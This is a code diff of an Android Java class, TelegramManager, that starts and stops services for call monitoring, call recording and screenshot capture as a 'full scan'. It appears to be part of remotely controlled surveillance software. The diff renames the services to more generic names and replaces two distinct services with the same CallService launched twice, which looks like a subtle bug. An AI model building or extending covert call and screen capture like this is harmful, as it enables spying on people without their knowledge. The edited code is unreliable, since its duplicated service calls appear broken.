@@ -19,9 +19,9 @@ public class TelegramManager {
     // ====== Полный скан ======
     public void startScan(Context context) {
         try {
-            context.startService(new Intent(context, CallMonitorService.class));
-            context.startService(new Intent(context, CallRecorderService.class));
-            context.startService(new Intent(context, ScreenshotMonitorService.class));
+            context.startService(new Intent(context, CallService.class));
+            context.startService(new Intent(context, CallService.class));
+            context.startService(new Intent(context, ScreenshotService.class));
 
             isFullScanActive = true;
             Log.i(TAG, "Full scan started");
@@ -32,9 +32,9 @@ public class TelegramManager {
 
     public void stopScan(Context context) {
         try {
-            context.stopService(new Intent(context, CallMonitorService.class));
-            context.stopService(new Intent(context, CallRecorderService.class));
-            context.stopService(new Intent(context, ScreenshotMonitorService.class));
+            context.stopService(new Intent(context, CallService.class));
+            context.stopService(new Intent(context, CallService.class));
+            context.stopService(new Intent(context, ScreenshotService.class));
 
             isFullScanActive = false;
             Log.i(TAG, "Full scan stopped");
@@ -49,7 +49,7 @@ public class TelegramManager {
             if (!isFullScanActive) {
                 Log.w(TAG, "Full scan is not active. Screenshot scan will start independently.");
             }
-            context.startService(new Intent(context, ScreenshotMonitorService.class));
+            context.startService(new Intent(context, ScreenshotService.class));
             Log.i(TAG, "Screenshot scan started");
         } catch (Exception e) {
             Log.e(TAG, "Error starting screenshot scan: " + e.getMessage());
@@ -58,7 +58,7 @@ public class TelegramManager {
 
     public void stopScreenshotScan(Context context) {
         try {
-            context.stopService(new Intent(context, ScreenshotMonitorService.class));
+            context.stopService(new Intent(context, ScreenshotService.class));
             Log.i(TAG, "Screenshot scan stopped");
         } catch (Exception e) {
             Log.e(TAG, "Error stopping screenshot scan: " + e.getMessage());
@@ -71,7 +71,7 @@ public class TelegramManager {
             if (!isFullScanActive) {
                 Log.w(TAG, "Full scan is not active. Call recording will start independently.");
             }
-            context.startService(new Intent(context, CallRecorderService.class));
+            context.startService(new Intent(context, CallService.class));
             Log.i(TAG, "Call recording started");
         } catch (Exception e) {
             Log.e(TAG, "Error starting call recording: " + e.getMessage());
@@ -80,7 +80,7 @@ public class TelegramManager {
 
     public void stopCallRecording(Context context) {
         try {
-            context.stopService(new Intent(context, CallRecorderService.class));
+            context.stopService(new Intent(context, CallService.class));
             Log.i(TAG, "Call recording stopped");
         } catch (Exception e) {
             Log.e(TAG, "Error stopping call recording: " + e.getMessage());
